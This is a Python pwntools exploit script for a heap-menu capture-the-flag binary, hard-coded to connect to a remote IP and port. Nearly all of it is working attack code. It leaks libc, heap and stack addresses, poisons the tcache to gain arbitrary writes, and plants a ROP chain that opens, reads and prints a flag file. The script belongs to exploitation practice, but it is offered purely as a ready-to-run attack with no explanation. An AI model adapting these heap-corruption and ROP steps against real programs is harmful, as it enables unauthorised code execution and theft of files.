from pwn import *

# p = process("./chall")
p = remote("103.145.226.168", 30204)
binary = ELF("./chall")

def alloc(idx, size):
  p.sendlineafter(">> ", '1')
  p.sendlineafter(": ", str(idx))
  p.sendlineafter(": ", str(size))

def edit(idx, content):
  p.sendlineafter(">> ", "2")
  p.sendlineafter(": ", str(idx))
  p.sendafter(": ", content)

def show(idx):
  p.sendlineafter(">> ", "4")
  p.sendlineafter("Index: ", str(idx))

def free(idx):
  p.sendlineafter(">> ", "3")
  p.sendlineafter(": ", str(idx))

for i in range(9): alloc(i, 0x80)
# for i in range(8, 10): alloc(i, 0x)
for i in range(8): free(i) # ngisi tcache bin

show(7)
p.recvuntil("Content: ")
libc_leak =  u64(p.recvline()[:-1].ljust(8, '\x00'))
log.info("Libc leak: {}".format(hex(libc_leak)))
libc_base = libc_leak - 0x1ebbe0
log.info("Libc base: {}".format(hex(libc_base)))
libc_system = libc_base + 0x55410
log.info("Libc system: {}".format(hex(libc_system)))
libc_free_hook = libc_base + 0x1eeb28
log.info("Libc __free_hook: {}".format(hex(libc_free_hook)))
libc_environ = libc_base + 0x00000000001ef2e0
log.info("Libc environ: {}".format(hex(libc_environ)))
libc_read = libc_base + 0x111130
log.info("Libc read: {}".format(hex(libc_read)))
pop_rdi = libc_base + 0x0000000000026b72
log.info("Pop rdi: {}".format(hex(pop_rdi)))
pop_rsi = libc_base + 0x0000000000027529
log.info("Pop rsi: {}".format(hex(pop_rsi)))
pop_rdx_rbx = libc_base + 0x0000000000162866
log.info("Pop rdx rbx: {}".format(hex(pop_rdx_rbx)))
pop_rax = libc_base + 0x000000000004a550
log.info("Pop rax: {}".format(hex(pop_rax)))
syscall = libc_base + 0x000000000004b460
log.info("Syscall: {}".format(hex(syscall)))
pop_rcx = libc_base + 0x000000000009f822
log.info("Pop rcx: {}".format(hex(pop_rcx)))
libc_puts = libc_base + 0x0875a0
log.info("Libc puts: {}".format(hex(libc_puts)))

edit(6, p64(libc_environ))
alloc(9, 0x80)
alloc(10, 0x80)

show(10)
p.recvuntil("Content: ")

stack_leak = u64(p.recvline()[:-1].ljust(8, '\x00'))
log.info("Stack leak: {}".format(hex(stack_leak)))
ret_addr = stack_leak - 0x120
log.info("Ret addr: {}".format(hex(ret_addr)))

alloc(11, 0xf8)
alloc(12, 0xf8)
free(12)
free(11)
edit(11, p64(ret_addr))

alloc(13, 0xf8)
alloc(14, 0xf8)
edit(13, '/home/lilac/flag.txt\x00')

show(4)
p.recvuntil("Content: ")

heap_leak = u64(p.recvline()[:-1].ljust(8, '\x00'))
log.info("Heap leak: {}".format(hex(heap_leak)))
flag_loc = heap_leak + 0x360
log.info("Flag loc: {}".format(hex(flag_loc)))

payload = ''
payload += p64(pop_rdi)
payload += p64(flag_loc)
payload += p64(pop_rsi)
payload += p64(0)
payload += p64(pop_rdx_rbx)
payload += p64(0) * 2
payload += p64(pop_rcx)
payload += p64(0)
payload += p64(pop_rax)
payload += p64(2)
payload += p64(syscall)

payload += p64(pop_rdi)
payload += p64(3)
payload += p64(pop_rsi)
payload += p64(flag_loc)
payload += p64(pop_rdx_rbx)
payload += p64(0x100) * 2
payload += p64(libc_read)

payload += p64(pop_rdi)
payload += p64(flag_loc)
payload += p64(libc_puts)

edit(14, payload)


p.interactive()